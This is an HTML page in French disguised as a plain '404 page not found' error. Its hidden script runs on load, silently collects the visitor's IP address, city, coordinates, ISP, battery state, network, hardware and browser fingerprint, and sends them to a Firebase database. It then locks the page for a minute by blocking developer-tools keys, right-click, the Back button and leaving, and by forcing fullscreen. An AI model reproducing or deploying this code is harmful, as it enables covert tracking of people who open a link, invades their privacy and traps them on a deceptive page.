<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>404 - Page introuvable</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: #333;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
            overflow: hidden;
        }
        .error-icon {
            width: 100px;
            height: 100px;
            border: 4px solid #ccc;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            background-color: #f9f9f9;
        }
        .error-icon span {
            font-size: 50px;
            font-weight: bold;
            color: #aaa;
            line-height: 1;
        }
        h1 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            color: #777;
            max-width: 500px;
            margin-bottom: 20px;
        }
        .error-code {
            font-size: 14px;
            color: #bbb;
        }
    </style>
</head>
<body>

    <!-- Contenu 404 simple -->
    <div class="error-icon">
        <span>!</span>
    </div>
    <h1>Page introuvable</h1>
    <p>La page que vous recherchez a peut-être été supprimée, renommée ou est temporairement indisponible.</p>
    <div class="error-code">Erreur 404</div>

    <script type="module">
        // ===================== ANTI-INSPECT & BLOCAGE =====================
        function lockPage(durationMs) {
            // Désactiver toutes les interactions
            document.body.style.pointerEvents = 'none';
            document.documentElement.style.pointerEvents = 'none';
            document.body.style.userSelect = 'none';
            document.documentElement.style.userSelect = 'none';
            
            // Bloquer le clic droit
            document.addEventListener('contextmenu', e => e.preventDefault(), true);
            
            // Bloquer les touches (F12, Ctrl+U, etc.)
            const keyHandler = (e) => {
                e.preventDefault();
                if (
                    e.key === 'F12' ||
                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
                    (e.ctrlKey && e.key === 'U') ||
                    e.key === 'Escape'
                ) {
                    e.preventDefault();
                }
            };
            document.addEventListener('keydown', keyHandler, true);

            // Empêcher le retour en arrière
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', () => history.pushState(null, null, location.href));

            // Tenter de passer en plein écran (cache l'interface navigateur)
            try {
                document.documentElement.requestFullscreen?.().catch(() => {});
            } catch (e) {}

            // Garder l'écran allumé sur mobile
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }

            // Dissuader la fermeture (message "quitter ?")
            const beforeUnloadHandler = (e) => {
                e.preventDefault();
                e.returnValue = '';
            };
            window.addEventListener('beforeunload', beforeUnloadHandler);

            // Débloquer après 1 minute (60 000 ms)
            setTimeout(() => {
                document.body.style.pointerEvents = '';
                document.documentElement.style.pointerEvents = '';
                document.removeEventListener('keydown', keyHandler, true);
                window.removeEventListener('beforeunload', beforeUnloadHandler);
                // La page reste sur la 404, mais l'utilisateur peut enfin fermer
            }, durationMs);
        }

        // ===================== COLLECTE ET ENVOI FIREBASE =====================
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d",
            measurementId: "G-RSKK2KZDQR"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function collectAndSendData() {
            let geoData = {};
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                geoData = await response.json();
            } catch (e) {}

            let batteryLevel = "N/A";
            let chargingStatus = "N/A";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                    chargingStatus = battery.charging ? "En charge" : "Décharge";
                } catch (e) {}
            }

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const connType = connection ? connection.effectiveType.toUpperCase() : "WIFI/LAN";
            const downlink = connection ? connection.downlink + " Mbps" : "N/A";
            const rtt = connection ? connection.rtt + " ms" : "N/A";

            const userAgent = navigator.userAgent;
            const langue = navigator.language;
            const fuseau = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const plateforme = navigator.platform || "Inconnue";
            const cookieEnabled = navigator.cookieEnabled ? "Oui" : "Non";
            const online = navigator.onLine ? "En ligne" : "Hors ligne";
            const resolutionEcran = `${window.screen.width}x${window.screen.height}`;
            const profondeurCouleur = `${window.screen.colorDepth} bits`;
            const pointsTactiles = navigator.maxTouchPoints || 0;
            const orientation = screen.orientation ? screen.orientation.type : "Inconnue";
            const pixelRatio = window.devicePixelRatio || 1;
            const webdriver = navigator.webdriver ? "Oui (automatisé)" : "Non";
            const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cœurs" : "Inconnu";
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Inconnue";
            const urlPage = window.location.href;

            let typeAppareil = "PC Bureau";
            if (/iPhone|iPad|iPod/i.test(userAgent)) typeAppareil = "iPhone/iPad";
            else if (/Android/i.test(userAgent)) typeAppareil = "Smartphone Android";
            else if (/Mac/i.test(userAgent)) typeAppareil = "Mac";

            const sessionId = 'SESS-' + Math.random().toString(36).substr(2, 8).toUpperCase();

            const data = {
                session_id: sessionId,
                ip: geoData.ip || "N/A",
                ville: geoData.city || "Inconnue",
                pays: geoData.country || "Inconnu",
                isp: geoData.organization || "Inconnu",
                latitude: geoData.latitude || null,
                longitude: geoData.longitude || null,
                heure_clic: serverTimestamp(),
                heure_locale: new Date().toLocaleString('fr-FR'),
                batterie: batteryLevel,
                etat_batterie: chargingStatus,
                connexion: connType,
                debit: downlink,
                rtt: rtt,
                langue: langue,
                fuseau_horaire: fuseau,
                plateforme: plateforme,
                cookies_actifs: cookieEnabled,
                statut_online: online,
                resolution_ecran: resolutionEcran,
                profondeur_couleur: profondeurCouleur,
                points_tactiles: pointsTactiles,
                orientation_ecran: orientation,
                pixel_ratio: pixelRatio,
                webdriver: webdriver,
                cpu_cores: cpuCores,
                ram: ram,
                type_appareil: typeAppareil,
                url_page: urlPage,
                user_agent: userAgent,
                date_clic: serverTimestamp()
            };

            try {
                await addDoc(collection(db, "visites_mysteres"), data);
                console.log("Données envoyées");
            } catch (error) {
                console.error("Erreur d'envoi :", error);
            }
        }

        // ===================== LANCEMENT =====================
        // On collecte les données puis on bloque la page pendant 60 secondes
        collectAndSendData().finally(() => {
            lockPage(60000); // 60 000 ms = 1 minute
        });
    </script>
</body>
</html>
